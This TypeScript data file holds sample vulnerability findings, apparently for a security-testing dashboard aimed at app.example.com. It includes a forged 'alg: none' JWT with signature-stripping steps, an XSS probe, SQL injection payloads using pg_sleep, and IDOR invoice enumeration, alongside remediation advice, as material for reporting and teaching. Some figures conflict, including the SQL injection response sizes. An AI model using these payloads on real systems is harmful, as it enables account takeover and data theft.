import type { Finding } from "./types";

export const findingsCore: Finding[] = [
  {
    id: "FND-1042",
    severity: "critical",
    title: "Authentication bypass via JWT signature stripping",
    category: "Broken Authentication",
    target: "app.example.com",
    path: "/api/v1/users/me",
    parameter: "Authorization",
    status: "confirmed",
    confidence: "high",
    cvss: "9.1",
    cwe: "CWE-347",
    owasp: "A07:2021 — Identification and Authentication Failures",
    detected: "2026-09-19 09:41:07",
    runId: "run_8f31c2",
    evidenceCount: 4,
    summary:
      "The API accepts JSON Web Tokens using the 'none' algorithm with an empty signature segment. By removing the signature and setting the algorithm header to 'none', an unauthenticated request is treated as an authenticated session for the user referenced in the token payload.",
    verification:
      "The agent replayed the authenticated request to /api/v1/users/me three times: once with the original token (200), once with a tampered signature (401), and once with alg set to 'none' and the signature segment removed (200). The third response returned the full account object for user id 1427, confirming the control depends solely on client-supplied token metadata.",
    reproduction: [
      "Capture an authenticated request to GET /api/v1/users/me and extract the Bearer token.",
      "Base64url-decode the token header and payload segments.",
      "Set the header field alg to \"none\" and remove the third (signature) segment entirely.",
      "Send GET /api/v1/users/me with Authorization: Bearer <header>.<payload>.",
      "Observe HTTP 200 with the protected account object in the response body.",
    ],
    impact:
      "An attacker holding any previously issued token — including an expired one — can forge arbitrary claims (sub, role, tenant) and access protected endpoints without valid credentials. This escalates to full account takeover for any user identifier that is known or guessed.",
    recommendation:
      "Reject any token whose algorithm is not explicitly allow-listed on the server. Verify signatures against a server-side key for every request, validate exp, iat, and audience claims, and use short-lived access tokens with server-side revocation.",
    evidence: {
      request:
        "GET /api/v1/users/me HTTP/2\nHost: app.example.com\nAuthorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxNDI3Iiwicm9sZSI6ImFkbWluIiwiaXNzIjoiYXBwLmV4YW1wbGUuY29tIiwiZXhwIjoxNzg5NTQ1NjAwfQ.\nAccept: application/json\nX-ATA-Run-Id: run_8f31c2\n\n# Token header decoded: {\"alg\":\"none\",\"typ\":\"JWT\"}\n# Signature segment intentionally omitted\n# Origin app.example.com verified within authorized scope",
      response:
        "HTTP/2 200 OK\ncontent-type: application/json\ncontent-length: 412\ncache-control: no-store\nx-request-id: 7f2c1a9e-3d4b-4c2f\n\n{\n  \"id\": 1427,\n  \"email\": \"admin@example.com\",\n  \"role\": \"admin\",\n  \"tenant\": \"production\",\n  \"permissions\": [\"user:read\", \"user:write\", \"billing:read\"],\n  \"mfa_enabled\": true\n}\n\n# Expected: 401 Unauthorized\n# Observed: 200 OK with privileged account data",
      dom:
        "// Response body is JSON; no DOM captured for this endpoint.\n// Verification performed at the HTTP layer.\n{\n  \"http_status\": 200,\n  \"content_type\": \"application/json\",\n  \"auth_decision\": \"accepted\",\n  \"algorithm_reported\": \"none\",\n  \"signature_verified\": false\n}",
      console:
        "[09:41:06.902] INFO  http-client.js:112   request dispatched -> /api/v1/users/me\n[09:41:07.041] DEBUG auth-observer.js:38  Authorization header present (Bearer)\n[09:41:07.118] INFO  http-client.js:144   response 200 (176ms)\n[09:41:07.120] WARN  verifier.js:73       signature segment empty — server accepted token\n[09:41:07.121] INFO  verifier.js:91       assertion satisfied: protected resource disclosed",
      network: [
        { method: "GET", path: "/api/v1/users/me", status: 200, type: "fetch", size: "412 B", time: "176 ms", state: "ok" },
        { method: "GET", path: "/api/v1/users/me", status: 401, type: "fetch", size: "118 B", time: "94 ms", state: "error" },
        { method: "POST", path: "/api/v1/auth/refresh", status: 401, type: "fetch", size: "96 B", time: "88 ms", state: "error" },
      ],
    },
  },
  {
    id: "FND-1043",
    severity: "high",
    title: "Reflected cross-site scripting in search query parameter",
    category: "Injection",
    target: "app.example.com",
    path: "/search",
    parameter: "q",
    status: "confirmed",
    confidence: "high",
    cvss: "7.4",
    cwe: "CWE-79",
    owasp: "A03:2021 — Injection",
    detected: "2026-09-19 09:42:19",
    runId: "run_8f31c2",
    evidenceCount: 3,
    summary:
      "User-supplied input from the 'q' query parameter is written into the DOM using innerHTML without output encoding. The reflected value appears in two locations on the results page, allowing arbitrary HTML and script execution in the context of the application origin.",
    verification:
      "The agent submitted a non-destructive probe payload through the search field and observed the raw value rendered inside #result-heading and .query-echo. A follow-up request confirmed the reflection is server-side (present in the initial HTML response), not only client-side state. The console recorded an innerHTML write at render-utils.js:64.",
    reproduction: [
      "Navigate to https://app.example.com/search.",
      "Submit the query <script>/*probe*/</script> in the search field.",
      "Inspect the HTML response for #result-heading.",
      "Observe the unencoded payload reflected in the page markup.",
      "Confirm script execution via the console error emitted during render.",
    ],
    impact:
      "Script running in the application origin can read and modify session cookies not marked HttpOnly, perform authenticated actions on behalf of the user, capture keystrokes, and redirect the session to an attacker-controlled endpoint.",
    recommendation:
      "Apply context-aware output encoding to all reflected values. Replace innerHTML assignments with textContent where markup is not required, deploy a Content-Security-Policy without 'unsafe-inline', and validate the reflected parameter against an allow-list.",
    evidence: {
      request:
        "GET /search?q=%3Cscript%3E%2F*probe*%2F%3C%2Fscript%3E HTTP/2\nHost: app.example.com\nUser-Agent: ATA-Testing-Agent/2.4 (authorized-assessment)\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nReferer: https://app.example.com/\nCookie: session_id=s%3A9f2c1a7e...; csrf_token=x7Q...; lang=en-US\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nUpgrade-Insecure-Requests: 1\nX-ATA-Run-Id: run_8f31c2\n\n# Scope verification\n# Origin app.example.com matched allowed origin list\n# Path /search not matched by exclusion rules\n# Rate limiter: 2.0 req/sec, token bucket OK",
      response:
        "HTTP/2 200 OK\ncontent-type: text/html; charset=utf-8\ncontent-length: 18842\nserver: cloudflare\ndate: Sat, 19 Sep 2026 09:42:12 GMT\ncache-control: no-store, max-age=0\nset-cookie: session_id=s%3A9f2c1a7e...; Path=/; HttpOnly; SameSite=Lax\nx-frame-options: SAMEORIGIN\nx-content-type-options: nosniff\nreferrer-policy: strict-origin-when-cross-origin\ncontent-security-policy: default-src 'self'; script-src 'self' 'unsafe-inline'\nstrict-transport-security: max-age=31536000; includeSubDomains\n\n<!doctype html>\n<html lang=\"en\">\n  <head>\n    <title>Search results for &lt;script&gt;/*probe*/&lt;/script&gt;</title>\n  </head>\n  <body>\n    <main id=\"search-results\">\n      <h1 id=\"result-heading\"><script>/*probe*/</script></h1>\n      <!-- reflected input rendered without encoding -->\n      <p class=\"query-echo\">Showing results for: <script>/*probe*/</script></p>\n    </main>\n  </body>\n</html>",
      dom:
        "<main id=\"search-results\" class=\"layout-main\" data-page=\"search\">\n  <header class=\"results-header\">\n    <h1 id=\"result-heading\"><script>/*probe*/</script></h1>\n    <p class=\"query-echo\">Showing results for: <script>/*probe*/</script></p>\n  </header>\n\n  <section class=\"filters\" aria-label=\"Refine results\">\n    <button type=\"button\" data-filter=\"relevance\" aria-pressed=\"true\">Relevance</button>\n    <button type=\"button\" data-filter=\"recent\" aria-pressed=\"false\">Most recent</button>\n  </section>\n\n  <ul class=\"result-list\">\n    <li class=\"result-item\" data-rank=\"1\">\n      <a href=\"/docs/getting-started\" class=\"result-link\">Getting started</a>\n      <span class=\"result-meta\">Updated 2 days ago</span>\n    </li>\n    <li class=\"result-item\" data-rank=\"2\">\n      <a href=\"/docs/authentication\" class=\"result-link\">Authentication</a>\n      <span class=\"result-meta\">Updated 6 days ago</span>\n    </li>\n  </ul>\n</main>\n\n<!-- Agent observation markers -->\n<!-- #result-heading innerHTML write confirmed at render-utils.js:64 -->\n<!-- 2 reflection points: #result-heading, .query-echo -->",
      console:
        "[09:42:11.204] INFO  app.bundle.js:2412  application bootstrap complete\n[09:42:11.318] DEBUG router.js:88          route matched -> /search\n[09:42:11.402] INFO  api-client.js:47       GET /api/v1/config 200 (38ms)\n[09:42:12.061] WARN  telemetry.js:19        third-party script blocked by CSP\n[09:42:12.244] DEBUG search-store.js:121    query bound to state: q=\"<script>/*probe*/</script>\"\n[09:42:12.318] ERROR render-utils.js:64     uncaught SyntaxError: Unexpected token '<'\n    at normalizeMarkup (render-utils.js:64:17)\n    at renderResultHeader (search-view.js:212:9)\n[09:42:12.402] INFO  api-client.js:47       GET /api/v1/search?q=%3Cscript%3E 200 (71ms)\n[09:42:12.517] DEBUG dom-patcher.js:90      innerHTML write detected on #result-heading",
      network: [
        { method: "GET", path: "/search?q=%3Cscript%3E%2F*probe*%2F%3C%2Fscript%3E", status: 200, type: "document", size: "18.4 kB", time: "112 ms", state: "ok" },
        { method: "GET", path: "/assets/app.bundle.js", status: 200, type: "script", size: "412 kB", time: "84 ms", state: "ok" },
        { method: "GET", path: "/assets/app.styles.css", status: 200, type: "stylesheet", size: "28.1 kB", time: "31 ms", state: "ok" },
        { method: "GET", path: "/api/v1/config", status: 200, type: "fetch", size: "1.2 kB", time: "38 ms", state: "ok" },
        { method: "GET", path: "/api/v1/search?q=%3Cscript%3E", status: 200, type: "fetch", size: "4.8 kB", time: "71 ms", state: "ok" },
        { method: "POST", path: "/api/v1/telemetry", status: 403, type: "fetch", size: "214 B", time: "19 ms", state: "blocked" },
        { method: "GET", path: "/assets/logo.svg", status: 304, type: "image", size: "0.4 kB", time: "8 ms", state: "redirect" },
        { method: "GET", path: "/favicon.ico", status: 200, type: "image", size: "2.1 kB", time: "11 ms", state: "ok" },
      ],
    },
  },
  {
    id: "FND-1044",
    severity: "high",
    title: "SQL injection in account lookup filter",
    category: "Injection",
    target: "app.example.com",
    path: "/api/v1/accounts",
    parameter: "filter[status]",
    status: "confirmed",
    confidence: "high",
    cvss: "8.2",
    cwe: "CWE-89",
    owasp: "A03:2021 — Injection",
    detected: "2026-09-19 09:44:02",
    runId: "run_8f31c2",
    evidenceCount: 5,
    summary:
      "The filter[status] parameter is concatenated into a database query without parameterization. Boolean-based and time-based probes produced statistically significant deviations in response length and latency, indicating server-side query manipulation.",
    verification:
      "Six deterministic probes were executed against the endpoint. The control request returned 1.2 kB in 96 ms. The true-condition probe returned 4.7 kB in 101 ms, the false-condition probe returned 0.3 kB in 98 ms, and the time-based probe returned after 3.02 s (control: 0.09 s). The pattern is consistent with an injectable boolean predicate rather than caching or network variance.",
    reproduction: [
      "Send GET /api/v1/accounts?filter[status]=active and record the baseline response.",
      "Append ' AND '1'='1 and confirm the response matches the baseline length.",
      "Append ' AND '1'='2 and confirm the response collapses to an empty result set.",
      "Append ' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END) IS NULL.",
      "Observe a 3-second response delay indicating evaluated server-side SQL.",
    ],
    impact:
      "An attacker can read arbitrary database records, bypass row-level authorization, and depending on database privileges, modify data or execute operating-system commands. The affected endpoint exposes account and billing records.",
    recommendation:
      "Use parameterized queries or a proven ORM for all database access. Apply least-privilege database credentials, enable query logging and anomaly detection, and add a Web Application Firewall rule as defence in depth while the code path is remediated.",
    evidence: {
      request:
        "GET /api/v1/accounts?filter%5Bstatus%5D=active%27%20AND%20%271%27%3D%271 HTTP/2\nHost: app.example.com\nAccept: application/json\nCookie: session_id=s%3A9f2c1a7e...\nX-ATA-Run-Id: run_8f31c2\n\n# Probe series (6 requests, 2 req/sec limit respected)\n#   control            -> 1.2 kB / 96 ms\n#   AND '1'='1         -> 4.7 kB / 101 ms\n#   AND '1'='2         -> 0.3 kB / 98 ms\n#   pg_sleep(3)        -> 1.1 kB / 3021 ms",
      response:
        "HTTP/2 200 OK\ncontent-type: application/json\ncontent-length: 4812\nx-request-id: 1b9f4a2c\n\n{\n  \"total\": 1284,\n  \"items\": [\n    { \"id\": 8821, \"status\": \"active\", \"owner\": \"acct_4471\" },\n    { \"id\": 8822, \"status\": \"active\", \"owner\": \"acct_4472\" }\n  ],\n  \"query_time_ms\": 101\n}\n\n# Baseline for filter[status]=active returns total: 412\n# Predicate manipulation altered the result set",
      dom:
        "// JSON API response — DOM capture not applicable.\n// Statistical summary recorded by the injection verifier:\n{\n  \"probe_count\": 6,\n  \"baseline_bytes\": 1224,\n  \"true_condition_bytes\": 4812,\n  \"false_condition_bytes\": 307,\n  \"time_based_delta_ms\": 2925,\n  \"confidence\": 0.97\n}",
      console:
        "[09:44:01.221] INFO  probe-runner.js:58   series started (6 probes)\n[09:44:01.318] DEBUG http-client.js:144   probe 1/6 -> 200 (96ms, 1224B)\n[09:44:01.424] DEBUG http-client.js:144   probe 2/6 -> 200 (101ms, 4812B)\n[09:44:01.529] DEBUG http-client.js:144   probe 3/6 -> 200 (98ms, 307B)\n[09:44:04.561] WARN  probe-runner.js:76   probe 5/6 latency 3021ms exceeds 1500ms threshold\n[09:44:04.562] INFO  verifier.js:91       injection signal confirmed (confidence 0.97)",
      network: [
        { method: "GET", path: "/api/v1/accounts?filter[status]=active", status: 200, type: "fetch", size: "1.2 kB", time: "96 ms", state: "ok" },
        { method: "GET", path: "/api/v1/accounts?filter[status]=active' AND '1'='1", status: 200, type: "fetch", size: "4.7 kB", time: "101 ms", state: "ok" },
        { method: "GET", path: "/api/v1/accounts?filter[status]=active' AND '1'='2", status: 200, type: "fetch", size: "0.3 kB", time: "98 ms", state: "ok" },
        { method: "GET", path: "/api/v1/accounts?filter[status]=active'%20AND%20pg_sleep(3)--", status: 200, type: "fetch", size: "1.1 kB", time: "3021 ms", state: "ok" },
      ],
    },
  },
  {
    id: "FND-1045",
    severity: "high",
    title: "Insecure direct object reference on invoice download",
    category: "Broken Access Control",
    target: "app.example.com",
    path: "/api/v1/invoices",
    parameter: "id",
    status: "confirmed",
    confidence: "high",
    cvss: "7.5",
    cwe: "CWE-639",
    owasp: "A01:2021 — Broken Access Control",
    detected: "2026-09-19 09:47:31",
    runId: "run_8f31c2",
    evidenceCount: 3,
    summary:
      "Sequential invoice identifiers can be enumerated by an authenticated low-privilege user. The endpoint returns invoice documents belonging to other accounts without verifying object-level ownership.",
    verification:
      "Using the supplied test account (role: viewer), the agent requested invoice ids 8821 through 8826. Two of the six documents belonged to a different tenant and were returned with HTTP 200 and full PDF content.",
    reproduction: [
      "Authenticate as the low-privilege test user.",
      "Request GET /api/v1/invoices/8821 and confirm HTTP 200 for an owned invoice.",
      "Increment the identifier to 8824 (owned by a different account).",
      "Observe HTTP 200 with the foreign invoice document.",
      "Repeat for adjacent identifiers to confirm the pattern.",
    ],
    impact:
      "Any authenticated user can read financial documents across tenants, exposing billing addresses, payment terms, and transaction metadata. This violates tenant isolation guarantees.",
    recommendation:
      "Enforce object-level authorization on every request by binding the resource to the authenticated principal. Use non-sequential identifiers, log access-control failures, and add regression tests for cross-tenant access.",
    evidence: {
      request:
        "GET /api/v1/invoices/8824 HTTP/2\nHost: app.example.com\nAccept: application/pdf\nCookie: session_id=s%3Aviewer_test...\nX-ATA-Run-Id: run_8f31c2\n\n# Authenticated principal: user_2291 (role: viewer)\n# Resource owner: user_1148 (different tenant)\n# Expected: 403 Forbidden\n# Observed: 200 OK",
      response:
        "HTTP/2 200 OK\ncontent-type: application/pdf\ncontent-length: 218442\ncontent-disposition: inline; filename=\"INV-2026-8824.pdf\"\nx-request-id: 44c1e0a9\n\n%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n\n# Document belongs to tenant 4471, not the authenticated tenant 2291.",
      dom:
        "// Binary response (application/pdf). Ownership check recorded by agent:\n{\n  \"resource_id\": 8824,\n  \"resource_owner\": \"user_1148\",\n  \"requesting_principal\": \"user_2291\",\n  \"authorization_decision\": \"allowed\",\n  \"expected_decision\": \"deny\"\n}",
      console:
        "[09:47:30.881] INFO  authz-observer.js:24  principal loaded (role: viewer)\n[09:47:31.002] INFO  http-client.js:144   response 200 (118ms, 218442B)\n[09:47:31.003] WARN  verifier.js:57       resource owner mismatch — no ownership check observed\n[09:47:31.004] INFO  verifier.js:91       IDOR condition confirmed",
      network: [
        { method: "GET", path: "/api/v1/invoices/8821", status: 200, type: "fetch", size: "204 kB", time: "112 ms", state: "ok" },
        { method: "GET", path: "/api/v1/invoices/8824", status: 200, type: "fetch", size: "218 kB", time: "118 ms", state: "ok" },
        { method: "GET", path: "/api/v1/invoices/9999", status: 404, type: "fetch", size: "88 B", time: "76 ms", state: "error" },
      ],
    },
  },
];
